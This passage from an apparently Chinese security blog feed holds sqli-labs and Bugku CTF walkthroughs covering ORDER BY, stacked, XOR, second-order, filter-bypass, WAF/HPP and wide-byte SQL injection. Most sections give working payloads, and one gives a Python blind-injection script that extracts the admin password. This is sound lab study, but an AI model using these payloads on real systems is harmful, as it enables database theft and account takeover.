class="php">?order=(select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00)) //正确?order=(select+1+regexp+if(substring(user(),1,1)=0x71,1,0x00)) //错误</code></pre><p><strong>3.利用updatexml</strong></p><pre><code class="php">?order=updatexml(1,if(1=1,1,user()),1)  //正确?order=updatexml(1,if(1=2,1,user()),1)  //错误</code></pre><p><strong>4.利用extractvalue</strong></p><pre><code class="php">?order=extractvalue(1,if(1=1,1,user())) //正确?order=extractvalue(1,if(1=2,1,user())) //错误</code></pre><p><strong>5、报错注入</strong></p><h5 id="2、利用盲注"><a href="#2、利用盲注" class="headerlink" title="2、利用盲注"></a>2、利用盲注</h5><p>如果直接<code>if(1=2,1,sleep(2))</code>sleep时间将会变成<code>2*当前表中记录的数目</code>，将会对服务器造成一定的拒绝服务攻击。</p><pre><code class="php">?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) //正常响应时间?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) //sleep 2秒</code></pre><p><strong>Less-46</strong><br>标题和ORDER BY 从句相关，应该就是order by排序注入。查看源码</p><pre><code class="php">$sql = &quot;SELECT * FROM users ORDER BY $id&quot;;</code></pre><p>发现根据输进去的id值是对应的那一列进行排序。<br>需要get传参<code>sort</code>，测试发现是数字型注入。使用<code>sort=1 desc</code>和<code>sort=1 asc</code>来判断，发现存在排序注入。<br><img src="http://img-blog.csdnimg.cn/20191116230945930.jpg" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20191116231029765.jpg" alt="在这里插入图片描述"><br>利用报错或利用盲注，进行爆库、爆表等其它注入操作。<br><em>利用报错</em></p><pre><code class="sql">sort=1 and updatexml(1,concat(0x7e,database(),0x7e),1)</code></pre><p><img src="http://img-blog.csdnimg.cn/2019111623135124.jpg" alt="在这里插入图片描述"><br><em>利用盲注</em><br>两个and，前两个条件只要有一个条件是false就不会运行if语句。</p><pre><code class="sql">sort=1 and (length(database())) = 8 and if(1=1, sleep(1), null)</code></pre><p>或结合rand()</p><pre><code class="sql">sort=rand(ascii(substr((select database()),1,1))&gt;127)</code></pre><p><strong>Less-47</strong><br>与Less-46相比，闭合方式变为<code>&#39;</code>闭合。其它参考Less-46。<br><strong>Less-48</strong><br>盲注测试，发现是数字型注入。进行盲注</p><pre><code class="sql">sort=rand(ascii(substr((select database()),1,1))&gt;127)</code></pre><p><strong>Less-49</strong><br>闭合方式为<code>&#39;</code>闭合。测试后发现Less-48的方法行不通。应该可以使用时间盲注。测试后发现，可以使用时间盲注。</p><pre><code class="sql">sort=1&#39; and if(((ascii(substr((select database()),1,1)))&gt;1),sleep(3),0)--+</code></pre><p><strong>Less-50</strong><br>数字型注入。利用报错。参考Less-46。源码中使用<code>mysqli_multi_query()</code>函数，也可以进行堆叠注入。</p><pre><code class="sql">sort=1;insert into users(id,username,password) values(&#39;16&#39;,&#39;qwzf&#39;,&#39;qwzf&#39;);</code></pre><p><img src="http://img-blog.csdnimg.cn/20191117004905960.jpg" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20191117004806616.jpg" alt="在这里插入图片描述"><br><strong>Less-51</strong><br>单引号闭合，desc,asc判断是order by注入。可以利用报错。源码中使用<code>mysqli_multi_query()</code>函数也，可以进行堆叠注入。<br><strong>Less-52</strong><br>盲注判断为数字型注入。依然有<code>mysqli_multi_query()</code>函数，可以进行堆叠注入。<br><strong>Less-53</strong><br>和Less-52相比，变成单引号闭合。</p><h3 id="三、异或注入"><a href="#三、异或注入" class="headerlink" title="三、异或注入"></a>三、异或注入</h3><p>通过攻关sqli-labs的方式基本上总结完SQL注入了。但我又发现了一种SQL注入类型–异或注入，于是就再总结一下。</p><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>在尝试SQL注入时,发现<code>union</code>,<code>and</code>被完全过滤掉了,就可以考虑使用异或注入。</p><h4 id="异或注入的原理"><a href="#异或注入的原理" class="headerlink" title="异或注入的原理"></a>异或注入的原理</h4><p>异或是一种逻辑运算，运算法则简言之就是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1），null与任何条件做异或运算都为null。<br>如果从数学的角度理解就是，空集与任何集合的交集都为空。<br>mysql里异或运算符为<code>^</code> 或者 <code>xor</code></p><ul><li>两个同为真的条件做异或，结果为假</li><li>两个同为假的条件做异或，结果为假</li><li>一个条件为真，一个条件为假，结果为真</li><li>null与任何条件（真、假、null）做异或，结果都为null</li></ul><h4 id="xor与-区别"><a href="#xor与-区别" class="headerlink" title="xor与^区别"></a>xor与^区别</h4><ul><li><code>^</code>运算符会做位异或运算 如1<code>^</code>2=3 1<code>^</code>2=3</li><li>xor做逻辑运算 <code>1 xor 0</code> 会输出1 其他情况输出其他所有数据</li></ul><h4 id="判断过滤"><a href="#判断过滤" class="headerlink" title="判断过滤"></a>判断过滤</h4><p>在id=1后面输入 <code>&#39; ^ (0)--+</code><br><code>?id=1&#39; ^ (length(&#39;union&#39;)=5)--+</code><br>当union被过滤时<code>1^0</code> 输出id=1<br>当union没被过滤时 <code>1^1</code> 输出 id=0</p><h4 id="CTF例题实战-1"><a href="#CTF例题实战-1" class="headerlink" title="CTF例题实战"></a>CTF例题实战</h4><p>例题：Bugku-多次<br>环境平台：<a href="https://ctf.bugku.com/challenges" target="_blank" rel="noopener">Bugku</a><br><img src="http://img-blog.csdnimg.cn/20191121195152148.jpg" alt="在这里插入图片描述"><br>加上<code>&#39;</code>，报错但是<code>%23</code>不报错，说明是字符注入。<br>加上<code>&#39;--+</code>，也不报错，说明可以用<code>--+</code>注释。<br>加上<code>&#39; or 1=1--+</code>,报错；尝试<code>&#39; oorr 1=1--+</code>，正常；说明or被过滤了。</p><p>如果要判断哪些关键字被过滤，可以使用异或注入。</p><pre><code class="sql">id=1&#39;^(length(&#39;union&#39;)!=0)--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20191121195152148.jpg" alt="在这里插入图片描述"><br>返回正常说明union被过滤了。<br>同理，尝试出来被过滤的关键字：union、select、and、or、（order、information中含or）<br>由最上面知道可以双写绕过。<br><strong>猜字段数</strong></p><pre><code class="sql">http://123.206.87.240:9004/1ndex.php?id=1&#39; oorrder by 2 --+ 正常http://123.206.87.240:9004/1ndex.php?id=1&#39; oorrder by 3 --+ 报错</code></pre><p>字段数为2<br><strong>判断显示位</strong></p><pre><code class="sql">id=-1&#39; ununionion selselectect 1,2 --+</code></pre><p><img src="http://img-blog.csdnimg.cn/20191121201122662.jpg" alt="在这里插入图片描述"><br>显示位在2<br><strong>爆库</strong></p><pre><code class="sql">id=-1&#39; ununionion selselectect 1,database() --+</code></pre><p>库名：web1002-1<br><strong>爆表</strong></p><pre><code class="sql">id=-1&#39; ununionion selselectect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#39;web1002-1&#39;--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20191121201929518.jpg" alt="在这里插入图片描述"><br>其他就不演示了。</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>Page-3通关完毕。39关到45关主要涉及堆叠注入，46关到53关主要涉及order by排序注入。看了一眼，发现Page-4的关卡会限定查询次数，最多只能尝试10次。其他基本都是些常规的注入操作，就不总结了。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 题目复现 </tag>
            
            <tag> 靶场练习 </tag>
            
            <tag> 堆叠注入 </tag>
            
            <tag> order by排序注入 </tag>
            
            <tag> 异或注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs攻关4(Adv)(Less-23_Less-38)</title>
      <link href="/2019/11/12/sqli-labs%E6%94%BB%E5%85%B34(Adv)(Less-23_Less-38)/"/>
      <url>/2019/11/12/sqli-labs%E6%94%BB%E5%85%B34(Adv)(Less-23_Less-38)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>总结完最常见的GET型和POST型的联合查询注入、报错注入、SQL盲注，以及简单POST注入。于是继续总结二次注入、GET型过滤敏感关键字注入、WAF绕过注入、宽字节注入。</p><h3 id="一、二次注入-Less-24"><a href="#一、二次注入-Less-24" class="headerlink" title="一、二次注入(Less-24)"></a>一、二次注入(Less-24)</h3><p><strong>二次注入</strong>：攻击者构造的恶意数据存储到数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。<br><strong>二次注入需要具备的两个条件</strong>：</p><ol><li>用户向数据库插入恶意语句(即使后端对语句进行了转义，如<code>mysql_escape_string</code>、<code>mysql_real_escape_string</code>转义)</li><li>数据库对自己存储的数据非常放心，直接取出恶意数据给用户</li></ol><p><strong>Less-24</strong><br>猜测这是二次注入，查看源码发现与数据库交互的有注册、登录和改密，即<code>login_create.php</code>，<code>login.php</code>，<code>pass_change.php</code>这三个文件。<br>login_create.php</p><pre><code class="php">$username=  mysql_escape_string($_POST[&#39;username&#39;]) ;$pass= mysql_escape_string($_POST[&#39;password&#39;]);$re_pass= mysql_escape_string($_POST[&#39;re_password&#39;]);echo &quot;&lt;font size=&#39;3&#39; color=&#39;#FFFF00&#39;&gt;&quot;;$sql = &quot;select count(*) from users where username=&#39;$username&#39;&quot;;</code></pre><p>login.php</p><pre><code class="php">$username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);$password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);$sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;</code></pre><p>pass_change.php</p><pre><code class="php">$username= $_SESSION[&quot;username&quot;];$curr_pass= mysql_real_escape_string($_POST[&#39;current_password&#39;]);$pass= mysql_real_escape_string($_POST[&#39;password&#39;]);$re_pass= mysql_real_escape_string($_POST[&#39;re_password&#39;]);if($pass==$re_pass){        $sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;;</code></pre><p>发现很多传参都被过滤之后，才执行SQL语句，主要利用了<a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">mysql_real_escape_string()函数</a><br>只有<code>$_SESSION[&quot;username&quot;]</code>没有被过滤。这个SQL语句是用来更改密码的。<br><img src="http://img-blog.csdnimg.cn/20191109195335374.jpg" alt="在这里插入图片描述"><br><code>mysql_real_escape_string()</code>函数只会过滤以下字符：<code>\x00</code>、<code>\n</code>、<code>\r</code>、<code>\</code>、<code>&#39;</code>、<code>&quot;</code>、<code>\x1a</code><br>而注释是不会过滤掉的，所以可以注册一个包含注释符号(如：<code>#</code>)的username，然后用这个username更改密码的时候会被注入到update语句中，更改注释前面的用户名的密码。</p><p>假设我们想登录admin账户且不知道账户密码。如果要更改用户名为admin的密码，只需注册一个<code>admin&#39;#</code>用户<br><img src="http://img-blog.csdnimg.cn/20191109201228226.jpg" alt="在这里插入图片描述"><br>然后登陆，更改密码为1234。看下数据库，发现admin账户的密码被改成了1234<br><img src="http://img-blog.csdnimg.cn/20191109201548493.jpg" alt="在这里插入图片描述"><br>然后登录框，输入<code>admin 1234</code>就可以登录admin账户了。。。<br><img src="http://img-blog.csdnimg.cn/20191109201959421.jpg" alt="在这里插入图片描述"></p><h3 id="二、GET型过滤敏感关键字注入-Less-23-Less-28a"><a href="#二、GET型过滤敏感关键字注入-Less-23-Less-28a" class="headerlink" title="二、GET型过滤敏感关键字注入(Less-23-Less-28a)"></a>二、GET型过滤敏感关键字注入(Less-23-Less-28a)</h3><p><strong>Less-23(过滤注释)</strong><br>添加<code>\</code>发现报错，得到闭合方式为<code>&#39;</code><br><img src="http://img-blog.csdnimg.cn/20191109214423747.jpg" alt="在这里插入图片描述"><br>测试发现<code>--+</code>、<code>#</code>和<code>%23</code>都被过滤了,即过滤了注释。<br><img src="http://img-blog.csdnimg.cn/20191109214715754.jpg" alt="在这里插入图片描述"><br>所以就只能用闭合后面引号的方法，根据报错可以知道语句为<code>id=&#39;$ID&#39; limit 0,1</code><br>那么可以这样闭合<code>id=1&#39; or &#39;1&#39;=&#39;1</code>或者是<code>id=1&#39; and &#39;1&#39;=&#39;1</code><br>其他注入操作，可以使用联合查询注入或报错注入或延时注入。这里举个爆库的例子<br><strong>联合查询注入</strong><br>联合查询前边步骤就不写了。直接爆库</p><pre><code class="sql">id=-1&#39; union select 1,database(),&#39;3</code></pre><p><img src="http://img-blog.csdnimg.cn/20191109220049111.jpg" alt="在这里插入图片描述"><br><strong>报错注入</strong></p><pre><code class="sql">id=1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1</code></pre><p><img src="http://img-blog.csdnimg.cn/20191109220432352.jpg" alt="在这里插入图片描述"><br><strong>延时注入(SQL盲注)</strong></p><pre><code class="sql">id=1&#39; and if(length(database())=8,sleep(5),1) and &#39;1&#39;=&#39;1</code></pre><pre><code class="sql">id=1&#39; and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1) and &#39;1&#39;=&#39;1</code></pre><p><strong>Less-25(过滤了or和and)</strong><br>单引号报错,依旧是单引号闭合，注释正常。<br><img src="http://img-blog.csdnimg.cn/20191109222352459.jpg" alt="在这里插入图片描述"><br>根据题目，发现果然是被过滤了and和or。然后看了一下源码怎么写的</p><pre><code class="php">function blacklist($id){    $id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);            //strip out OR (non case sensitive)    $id= preg_replace(&#39;/AND/i&#39;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)    return $id;}</code></pre><p>发现使用<a href="https://www.cnblogs.com/hubqin/p/6749433.html" target="_blank" rel="noopener">模式修正符</a><code>i</code>，<code>i</code> 在和模式进行匹配时不区分大小写。<br>所以不可以使用大小写绕过。<br><img src="http://img-blog.csdnimg.cn/20191109222937171.png" alt="在这里插入图片描述"><br>可以用逻辑运算符<code>&amp;&amp;</code>代替and，<code>||</code>代替or。但&amp;要换成%26url编码</p><pre><code class="sql">id=1&#39; || 1=1--+</code></pre><pre><code class="sql">id=1&#39; %26%26 1=1--+</code></pre><p>当然也可以使用双写绕过<code>aandnd</code>、<code>oorr</code>。<br>然后其他注入操作呢，依旧可以使用联合查询注入、报错注入，和Less-23类似。<br><strong>报错注入</strong></p><pre><code class="sql">id=1&#39; || updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20191109224312178.jpg" alt="在这里插入图片描述"><br><strong>Less-25a(过滤or和and的盲注)</strong><br>将Less-25的单引号字符型改为整型，然后使用盲注即可，注意双写绕过。<br><strong>布尔盲注</strong></p><pre><code class="sql">id=1 || length(database())=8 --+</code></pre><p>可以写个脚本，这里直接放上飘零师傅的脚本</p><pre><code class="python">#!/usr/bin/env python# -*- coding: utf-8 -*-import requests#url = &quot;http://localhost/sql/Less-25a/?id=2333 || ascii(substr((select database()),%s,1))=%d&quot;#url = &quot;http://localhost/sql/Less-25a/?id=2333 || ascii(substr((select group_concat(table_name) from infoorrmation_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%d&quot;#url = &quot;http://localhost/sql/Less-25a/?id=2333 || ascii(substr((select group_concat(column_name) from infoorrmation_schema.columns where table_name=&#39;users&#39;),%s,1))=%d&quot;url = &quot;http://localhost/sql/Less-25a/?id=2333 || ascii(substr((select passwoorrd from users where username=&#39;admin&#39;),%s,1))=%d&quot;result = &quot;&quot;# 爆库：select database()# security# 爆表：select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()# emails,referers,uagents,users# 爆字段：select group_concat(column_name) from infoorrmation_schema.columns where table_name=&#39;users&#39;# USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password# 拿数据：select passwoorrd from user where username=&#39;admin&#39;# 2333for i in range(1,100):    for j in range(33,127):        payload = url%(i,j)        s = requests.get(url=payload)        if &quot;Your Login name:Dumb&quot; in s.content:            result += chr(j)            print result            breakprint result</code></pre><p>当然也可以联合查询注入。</p><pre><code class="sql">id=-1 union select 1,database(),3--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20191109235530481.jpg" alt="在这里插入图片描述"><br><strong>Less-26(过滤注释和空格)</strong><br>题目标题说过滤了注释和空格。测试一下，看看是不是过滤了注释和空格。试了一把，发现还过滤了and和or。<br>输入</p><pre><code class="sql">?id=and or 1=1--+#</code></pre><p><img src="http://img-blog.csdnimg.cn/20191111220750831.jpg" alt="在这里插入图片描述"><br>然后又查看下源码</p><pre><code class="php">function blacklist($id){    $id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);            //strip out OR (non case sensitive)    $id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)    $id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);        //strip out /*    $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);        //Strip out --    $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);            //Strip out #    $id= preg_replace(&#39;/[\s]/&#39;,&quot;&quot;, $id);        //Strip out spaces    $id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id);        //Strip out slashes    return $id;}</code></pre><p>发现过滤了<code>and</code>，<code>or</code>，<code>单行多行注释</code>，<code>正反斜杠/与\</code> ,<code>空格</code>，没有过滤单引号。<br>对于注释可以进行单引号闭合，不使用注释；<br>对于<code>and</code>和<code>or</code>可以双写绕过；<br>对于空格，看大师傅博客，发现了一些方法：</p><blockquote><p>%09 TAB键（水平）<br>%09 TAB键（水平）<br>%0a 新建一行<br>%0c 新的一页<br>%0d return功能<br>%0b TAB键（垂直）<br>%a0 空格(应该是php转化的时候是一个特殊字符，然后mysql会解释为空白字符)</p></blockquote><p>然后，可以进行明注：联合查询注入、报错注入，也可以进行盲注。<br>这里我使用<code>%a0</code>代替空格(这里测试下爆库)。<br>试了若干次。。。发现Windows下无法使用这些特殊字符来替换空格。那就用linux(我用的ubantu)吧。。。</p><pre><code class="sql">id=0&#39;%a0union%a0select%a02,database(),&#39;3</code></pre><p><img src="http://img-blog.csdnimg.cn/20191112000314272.jpg" alt="在这里插入图片描述"><br><strong>Less-26a(过滤注释和空格的盲注)</strong><br>与Less-26相比，闭合方式变为<code>&#39;)</code>，且不会显示报错语句<br><strong>Less-27(过滤union和select)</strong><br>标题说过滤了<code>union</code>和<code>select</code>，我测试后发现还过滤了空格和注释。并且测试发现是单引号闭合<br>为了更加清楚的知道过滤了什么，查看源码</p><pre><code class="php">function blacklist($id){$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);        //strip out /*$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);        //Strip out --.$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);            //Strip out #.$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);        //Strip out spaces.$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.$id= preg_replace(&#39;/union/s&#39;,&quot;&quot;, $id);        //Strip out union$id= preg_replace(&#39;/select/s&#39;,&quot;&quot;, $id);        //Strip out select$id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id);        //Strip out UNION$id= preg_replace(&#39;/SELECT/s&#39;,&quot;&quot;, $id);        //Strip out SELECT$id= preg_replace(&#39;/Union/s&#39;,&quot;&quot;, $id);        //Strip out Union$id= preg_replace(&#39;/Select/s&#39;,&quot;&quot;, $id);        //Strip out selectreturn $id;}</code></pre><p><a href="http://www.xuebuyuan.com/1850494.html" target="_blank" rel="noopener">模式修正符</a><br>根据过滤代码，发现大小写类似<code>SelEct</code>，没被过滤。所以大小写绕过即可</p><pre><code class="sql">id=0&#39;%a0UnIon%a0SelEct%a02,database(),&#39;3</code></pre><p><strong>Less-27a(过滤union和select的盲注)</strong><br>与Less-27相比，不会显示报错语句，闭合方式变成双引号闭合。<br>闭合方式判断：<code>and 1=1</code>双引号显示正确，<code>and 1=0</code>双引号显示错误。可以大致确定是双引号闭合。<br><strong>Less-28(有括号的单引号字符型，过滤union和select等)</strong><br>与Less-27相比，闭合方式变成<code>&#39;)</code>闭合。看下源码</p><pre><code class="php">function blacklist($id){$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);                //strip out /*$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);                //Strip out --.$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);                    //Strip out #.$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);                //Strip out spaces.//$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);                    //Strip out spaces.$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);                //Strip out spaces.$id= preg_replace(&#39;/union\s+select/i&#39;,&quot;&quot;, $id);        //Strip out UNION &amp; SELECT.return $id;}</code></pre><p><strong>Less-28a(有括号的单引号字符型，过滤union和select等的盲注)</strong><br>和Less-28相同。。。看下源码</p><pre><code class="php">function blacklist($id){//$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);                //strip out /*//$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);                //Strip out --.//$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);                    //Strip out #.//$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);                //Strip out spaces.//$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);                    //Strip out spaces.//$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);                //Strip out spaces.$id= preg_replace(&#39;/union\s+select/i&#39;,&quot;&quot;, $id);        //Strip out spaces.return $id;}</code></pre><p>发现与Less-28相比，很多过滤还被注释了。如果把注释去掉，基本上过滤了所有字符，但是，所有的一次性过滤都能用双写绕过。当然也可以用盲注。</p><h3 id="三、WAF绕过注入-Less-29-Less-31"><a href="#三、WAF绕过注入-Less-29-Less-31" class="headerlink" title="三、WAF绕过注入(Less-29-Less-31)"></a>三、WAF绕过注入(Less-29-Less-31)</h3><p><strong>了解一下WAF</strong><br><a href="https://secsky.sinaapp.com/216.html" target="_blank" rel="noopener">WAF</a><br><a href="https://blog.csdn.net/nzjdsds/article/details/77758824" target="_blank" rel="noopener">MYSQL注入天书之服务器两层架构</a><br>在SQL注入过程中主流的WAF绕过技术：</p><blockquote><p>1.转换特征字符大小写<br>2.利用注释绕过<br>3.编码特征字符绕过<br>4.分隔重写特征字符绕过<br>5.利用截断字符绕过<br>6.变换变量位置绕过<br>7.针对域名保护的绕近<br>8.超大数据包绕过<br>9.转换数据提交方式绕过<br>10.HPP（HTTP参数污染）绕过</p></blockquote><pre><code class="sql">?id=1&amp;id=2</code></pre><p>apache(php)解析最后一个参数，即显示id=2的内容。Tomcat(jsp)解析第一个参数，即显示id=1的内容。Tomcat功能类似一个WAF<br>所以我们要传入两个id，第一个用来欺骗waf，第二个用来传送给apache。<br><strong>Less-29(基于WAF的一个错误)</strong><br>测试后发现是单引号闭合。并且没有过滤<code>注释</code>，<code>空格</code>，<code>引号</code>，<code>unsion</code>，<code>select</code>，<code>and</code>，<code>or</code>。<br>所以尝试直接测试</p><pre><code class="sql">id=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</code></pre><p><img src="http://img-blog.csdnimg.cn/20191112193403719.jpg" alt="在这里插入图片描述"><br>直接报错注入成功。。。。还是再试下吧！于是又试了下联合查询注入</p><pre><code class="sql">id=0&#39; union select 1,database(),3 --+</code></pre><p>依旧成功。。。。最后再试试linux系统下的。。。依旧成功。。。。<br><strong>Less-30(基于错误的GET型双引号字符型注入)</strong><br>测试后发现是双引号闭合，将 Less-29的payload的<code>&#39;</code>换成<code>&quot;</code></p><pre><code class="sql">id=0” union select 1,database(),3 --+</code></pre><p>发现失败了。于是看了下Less-29的标题和Less-30的标题。发现应该涉及了WAF。<br>查看源码，发现WAF在<code>login.php</code>里</p><pre><code class="php">//WAF implimentation with a whitelist approach..... only allows input to be Numeric.//使用白名单方法实现WAF。。。。。只允许输入为数字function whitelist($input){    $match = preg_match(&quot;/^\d+$/&quot;, $input);    if($match)    {        //echo &quot;you are good&quot;;        //return $match;    }    else    {            header(&#39;Location: hacked.php&#39;);        //echo &quot;you are bad&quot;;    }}// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).//当受到HPP（HTTP参数污染）时，下面的函数将模拟参数的行为function java_implimentation($query_string){    $q_s = $query_string;    $qs_array= explode(&quot;&amp;&quot;,$q_s);    foreach($qs_array as $key =&gt; $value)    {        $val=substr($value,0,2);        if($val==&quot;id&quot;)        {            $id_value=substr($value,3,30);             return $id_value;            echo &quot;&lt;br&gt;&quot;;            break;        }    }}</code></pre><p>所以waf是只允许输入数字的，我们在输入数字的时候先给waf看然后检测正常后才转发给我们需要访问的页面。然后模拟了HTTP参数污染时，参数的行为。所以应该可以用HTTP参数污染绕过。<br>这里就不详细分析了。参考飘零师傅的<a href="http://skysec.top/2017/07/20/SQLi-LABS(Adv)(Less-23%20~%20Less-38)/#Less-30" target="_blank" rel="noopener">分析</a>即可。<br>payload</p><pre><code class="sql">id=1&amp;id=0&quot; union select 1,2,database() --+</code></pre><p><img src="http://img-blog.csdnimg.cn/20191112202404343.jpg" alt="在这里插入图片描述"><br>Less-31(Protection with WAF用WAF防护)<br>闭合方式为<code>&quot;)</code>，解法参照Less-30</p><h3 id="四、宽字节注入-Less-32-Less-38"><a href="#四、宽字节注入-Less-32-Less-38" class="headerlink" title="四、宽字节注入(Less-32-Less-38)"></a>四、宽字节注入(Less-32-Less-38)</h3><p><strong>相关概念</strong></p><blockquote><p>单字节字符集： 所有的字符都使用一个字节来表示，比如 ASCII 编码。<br>多字节字符集： 在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。<br>两位的多字节字符有一个前导字节和尾字节。 在某个多字节字符集内，前导字节位于某个特定范围内，尾字节也一样。<br>UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。<br>常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 </p></blockquote><p><strong>前提条件</strong><br>要有宽字节注入漏洞</p><ol><li>首先要满足目标程序使用双<code>/</code>多字节字符集进行解析</li><li>其次不同字符集范围不一样，可能低位不包含单字节字符集的字符，这样就没办法了，所以要保证在该种字符集范围中包含低字节位，比如 0x5C(01011100) 的字符，即转义符<code>\</code>。</li></ol><p><strong>原理</strong><br>宽字节（两字节）带来的安全问题主要是吃ASCII字符（一字节）的现象，使用一些特殊字符来”吃掉“经过转义符 “ <code>\</code> ” 。<br><strong>注意</strong></p><ul><li>宽字节不只是出现在GBK编码，在PHP中，通过<code>iconv()</code>进行编码转换时，也可能出现宽字节注入。</li><li>这里所说的编码问题不是出现在HTML页面编码，而是与数据库的编码形式有关，一般我们在建立一个数据库的时候会让我们选择数据库的编码形式，所以有时候网站虽然是UTF-8写的，但是如果数据库是GBK的形式，也会出现宽字节。</li></ul><p><strong>MySQL中用于转义的函数</strong></p><blockquote><p>addslashes、mysql_real_escape_string、mysql_escape_string以及后面在高版本被去除的magic_quote_gpc</p></blockquote><p><strong>绕过方法</strong><br>因为宽字节注入主要是吃掉 <code>\</code> ，所以一般时候加一个 <code>%df</code> 这种就可以吃掉，其实加三个<code>%df</code>也可以吃掉，只要是奇数个<code>%df</code>即可。<br><strong>Less-32(绕过addslashes())</strong><br>测试后发现单引号双引号都不会报错,并且被<code>\</code>转义了，所以可以用宽字节注入<code>%df&#39;</code>报错。<br><code>&#39;</code>被加上反斜杠<code>\</code>，变成了 <code>%df\’</code>，其中<code>\</code>的十六进制是 <code>%5C</code> 所以 <code>%df\’ =%df%5c%27</code>，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 <code>%df%5c</code> 是一个宽字符，也就是<code>運&#39;</code>，即<code>%df\’ = %df%5c%27=運&#39;</code></p><p>然后再测试，发现是单引号闭合。于是试了下爆库</p><pre><code class="sql">id=0%df&#39; union select 1,2,database() --+</code></pre><p><img src="http://img-blog.csdnimg.cn/20191112205838419.jpg" alt="在这里插入图片描述"><br><strong>Less-33</strong><br>跟less-32多大区别，宽字节注入即可。<br><strong>Less-34(绕过添加斜杠)</strong><br>POST型的宽字节。</p><pre><code class="sql">uname=0%df&#39; union select 1,database()#&amp;passwd=&amp;submit=Submit</code></pre><p><img src="http://img-blog.csdnimg.cn/20191112210605106.jpg" alt="在这里插入图片描述"><br><strong>Less-35</strong><br>整型注入,不需要闭合</p><pre><code class="sql">id=0 union select 1,2,database() --+</code></pre><p><strong>Less-36</strong><br>查看源码，用了函数<a href="https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">mysql_real_escape_string()</a>，转义成功返回这些字符串，失败返回false。<br>宽字节注入，参考Less-32<br><strong>Less-37</strong><br>Less-34一样，只是过滤函数不同，使用函数mysql_real_escape_string()<br><strong>Less-38</strong><br>参考Less-32</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>Page-这次又收获了一些注入方法：二次注入、GET型过滤敏感关键字注入、WAF绕过注入、宽字节注入。<br>继续努力。。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场练习 </tag>
            
            <tag> 二次注入 </tag>
            
            <tag> 过滤敏感关键字与WAF绕过 </tag>
            
            <tag> 宽字节注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs攻关3(Less-11_Less-22)</title>
